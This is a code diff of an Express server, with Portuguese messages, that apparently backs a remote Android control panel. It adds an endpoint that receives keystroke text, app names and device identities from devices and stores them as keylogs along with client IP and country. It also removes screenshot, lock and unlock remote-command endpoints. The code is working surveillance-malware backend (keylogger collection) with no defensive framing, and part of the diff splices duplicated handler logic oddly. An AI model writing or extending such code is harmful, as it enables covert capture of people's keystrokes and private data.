@@ -285,15 +285,20 @@ async function startServer() {
       if (!ENV.runtimePanelUrl) {
         return res.status(404).json({
           success: false,
-          message: "Nenhuma configuração de APK encontrada",
+          message: "Nenhum build concluido encontrado para configuracao runtime.",
         });
       }
 
       return res.json({
         success: true,
         config: {
+          buildId: "runtime-fallback",
           panelUrl: ENV.runtimePanelUrl,
-          backendUrl: ENV.runtimeBackendUrl ?? "",
+          appName: ENV.runtimeAppName,
+          packageName: packageName || ENV.runtimePackageName,
+          artifactSource: "github",
+          createdAt: new Date(0).toISOString(),
+          updatedAt: new Date().toISOString(),
         },
       });
     }
@@ -464,6 +469,37 @@ async function startServer() {
       }
 
       const targetUser = await resolveDeviceOwner();
+      const { deviceId } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
+
+      await createKeylog({
+        userId: targetUser.id,
+        deviceId: String(deviceId),
+        appName: rawAppName.slice(0, 255),
+        keyText: rawKeyText,
+      });
+
+      return res.json({ success: true });
+    } catch (error) {
+      console.error("[Device Keylog] Failed:", error);
+      const message = error instanceof Error ? error.message : "Falha ao salvar keylog";
+      return res.status(500).json({ success: false, message });
+    }
+  });
+
+  app.post("/api/device/keylog", async (req, res) => {
+    try {
+      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
+      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
+      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
+      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
+      const rawAppName = typeof req.body?.appName === "string" ? req.body.appName : "Desconhecido";
+      const rawKeyText = typeof req.body?.keyText === "string" ? req.body.keyText.slice(0, 2048) : "";
+
+      if (!rawDeviceUid || !rawPackageName || !rawKeyText) {
+        return res.status(400).json({ success: false, message: "deviceUid, packageName e keyText sao obrigatorios" });
+      }
+
+      const targetUser = await resolveDeviceOwner();
       const { deviceId, deviceName } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
       const clientIp = extractClientIp(req);
       const countryCodeFromHeader = extractCountryCode(req);
@@ -528,108 +564,6 @@ async function startServer() {
       return res.status(500).json({ success: false, message: "Falha ao buscar comandos" });
     }
   });
-
-  // ===== NOVOS ENDPOINTS PARA CONTROLE REMOTO =====
-
-  // Endpoint para enviar comando de screenshot
-  app.post("/api/device/command/screenshot", async (req, res) => {
-    try {
-      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
-      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
-      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
-      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
-
-      if (!rawDeviceUid || !rawPackageName) {
-        return res.status(400).json({ success: false, message: "deviceUid e packageName sao obrigatorios" });
-      }
-
-      const targetUser = await resolveDeviceOwner();
-      const { deviceId } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
-      
-      // Enqueue comando de screenshot
-      const command = {
-        id: `screenshot-${Date.now()}`,
-        deviceId,
-        userId: targetUser.id,
-        type: "screenshot",
-        createdAt: new Date().toISOString(),
-      };
-      
-      console.log("[Device Screenshot Command] Enqueued:", command);
-      return res.json({ success: true, command });
-    } catch (error) {
-      console.error("[Device Screenshot Command] Failed:", error);
-      return res.status(500).json({ success: false, message: "Falha ao enviar comando de screenshot" });
-    }
-  });
-
-  // Endpoint para enviar comando de lock
-  app.post("/api/device/command/lock", async (req, res) => {
-    try {
-      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
-      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
-      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
-      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
-      const reason = typeof req.body?.reason === "string" ? req.body.reason : "Dispositivo travado";
-
-      if (!rawDeviceUid || !rawPackageName) {
-        return res.status(400).json({ success: false, message: "deviceUid e packageName sao obrigatorios" });
-      }
-
-      const targetUser = await resolveDeviceOwner();
-      const { deviceId } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
-      
-      // Enqueue comando de lock
-      const command = {
-        id: `lock-${Date.now()}`,
-        deviceId,
-        userId: targetUser.id,
-        type: "lock",
-        reason,
-        createdAt: new Date().toISOString(),
-      };
-      
-      console.log("[Device Lock Command] Enqueued:", command);
-      return res.json({ success: true, command });
-    } catch (error) {
-      console.error("[Device Lock Command] Failed:", error);
-      return res.status(500).json({ success: false, message: "Falha ao enviar comando de lock" });
-    }
-  });
-
-  // Endpoint para enviar comando de unlock
-  app.post("/api/device/command/unlock", async (req, res) => {
-    try {
-      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
-      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
-      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
-      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
-
-      if (!rawDeviceUid || !rawPackageName) {
-        return res.status(400).json({ success: false, message: "deviceUid e packageName sao obrigatorios" });
-      }
-
-      const targetUser = await resolveDeviceOwner();
-      const { deviceId } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
-      
-      // Enqueue comando de unlock
-      const command = {
-        id: `unlock-${Date.now()}`,
-        deviceId,
-        userId: targetUser.id,
-        type: "unlock",
-        createdAt: new Date().toISOString(),
-      };
-      
-      console.log("[Device Unlock Command] Enqueued:", command);
-      return res.json({ success: true, command });
-    } catch (error) {
-      console.error("[Device Unlock Command] Failed:", error);
-      return res.status(500).json({ success: false, message: "Falha ao enviar comando de unlock" });
-    }
-  });
-
-  // ===== FIM DOS NOVOS ENDPOINTS =====
 
   // development mode uses Vite, production mode uses static files
   const isDevelopment = process.env.NODE_ENV !== "production";
